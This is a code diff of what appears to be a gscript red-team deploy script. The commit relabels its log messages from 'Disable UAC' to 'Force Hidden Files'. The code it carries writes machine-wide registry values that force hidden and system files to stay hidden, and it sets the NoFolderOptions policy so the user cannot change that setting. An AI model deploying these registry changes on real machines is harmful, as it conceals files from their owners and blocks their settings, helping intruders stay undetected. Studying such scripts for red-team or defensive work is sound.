@@ -11,11 +11,11 @@
 //go_import:github.com/gen0cide/gscript/x/windows as windows
 
 function Deploy() {
-    console.log("Starting Disable UAC");
+    console.log("Starting Force Hidden Files");
 
     var value = 0;
     var value1 = 1;
-    // disable UAC
+    // disable showing hidden files
     windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN", "CheckedValue", value);
     windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN", "DefaultValue", value);
     windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "CheckedValue", value);
@@ -24,7 +24,7 @@ function Deploy() {
     windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SuperHidden", "DefaultValue", value);
     windows.AddRegKeyDWORD("LOCAL_MACHINE", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", value1);
 
-    console.log("Done Disable UAC");
+    console.log("Done Force Hidden Files");
     return true;
   }
   
